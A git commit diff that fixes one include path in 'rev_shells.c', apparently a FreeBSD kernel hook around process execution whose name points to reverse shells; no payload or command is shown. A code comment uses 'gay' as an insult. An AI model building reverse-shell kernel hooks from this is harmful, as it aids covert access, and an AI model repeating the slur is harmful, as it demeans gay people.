284dad6519c548c06745e32b33d52707ab4fcc21
Baremetal MSI <spark61974@gmail.com>
2025-02-13 13:23:54 -0500

    .

--- filter_hook/rev_shells.c
+++ filter_hook/rev_shells.c
@@ -27,7 +27,7 @@
 #include <sys/unistd.h> // for RFPROC
 #include <sys/imgact.h> // For image_args
 // /usr/src/sys/amd64/include/pcb.h
-#include </usr/src/sys/amd64/include/pcb.h> // for pcb struct
+#include <sys/amd64/include/pcb.h> // for pcb struct
 
 // since BSD is gay as hell and doesn't provide headers for these we declare them as external
 extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p,
